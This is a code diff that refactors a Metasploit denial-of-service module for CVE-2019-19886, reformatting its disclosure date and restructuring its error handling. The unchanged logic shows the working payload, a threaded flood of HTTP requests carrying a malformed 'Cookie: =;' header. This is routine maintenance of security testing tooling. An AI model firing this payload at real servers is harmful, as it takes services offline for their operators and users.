@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           ['CVE' '2019-19886']
         ],
-        'DisclosureDate' => 'Dec 18 2019'
+        'DisclosureDate' => '2019-12-18'
       )
     )
 
@@ -46,15 +46,13 @@ class MetasploitModule < Msf::Auxiliary
       threads = []
       1.upto(ubound) do |i|
         threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
-          begin
-            connect
-            sock.put("GET / HTTP/1.0\r\nCookie: =;\r\n\r\n")
-            disconnect
-          rescue StandardError => e
-            print_error("DoS packet error: #{e}")
-          ensure
-            disconnect
-          end
+          connect
+          sock.put("GET / HTTP/1.0\r\nCookie: =;\r\n\r\n")
+          disconnect
+        rescue StandardError => e
+          print_error("DoS packet error: #{e}")
+        ensure
+          disconnect
         end
       end
 
